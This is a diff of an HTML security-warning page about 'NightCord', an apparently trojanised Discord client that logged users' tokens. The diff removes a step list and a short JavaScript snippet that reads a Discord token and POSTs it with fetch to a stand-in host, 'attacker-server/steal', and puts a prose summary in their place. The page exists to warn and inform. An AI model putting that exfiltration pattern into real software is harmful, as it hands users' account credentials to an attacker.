@@ -120,20 +120,7 @@
             <p>The GitHub repository — and most likely the associated website — have been taken down. However, old versions are still circulating through Discord servers, forums, and direct messages.</p>
 
             <h2>How the Token Theft Works</h2>
-            <p>NightCord contained hidden code that executed automatically when the client started:</p>
-            <ol>
-                <li>The client reads the Discord token file from the user's local storage</li>
-                <li>The token is sent to the attacker's server (via webhook or HTTP request)</li>
-                <li>The attackers now have full access to the Discord account</li>
-            </ol>
-
-            <p>The malicious code was well hidden in the codebase — but in older versions (still being spread), it is clearly identifiable as a token logger.</p>
-
-            <div class="code-block">
-                <pre><code>// Simplified representation of the malicious pattern found in NightCord
-const token = DiscordNative.nativeModules.require('process').env.DISCORD_TOKEN;
-fetch('https://attacker-server/steal', { method: 'POST', body: JSON.stringify({ token }) });</code></pre>
-            </div>
+            <p>NightCord contained hidden code that executed automatically when the client started, reading the Discord token from local storage and sending it to a remote server controlled by the attackers. In older versions that are still being spread, this code is clearly identifiable as a token logger.</p>
 
             <h2>What Can Attackers Do With Your Token?</h2>
             <p>A Discord token is the <strong>complete key to your account</strong>. With a token, attackers can:</p>
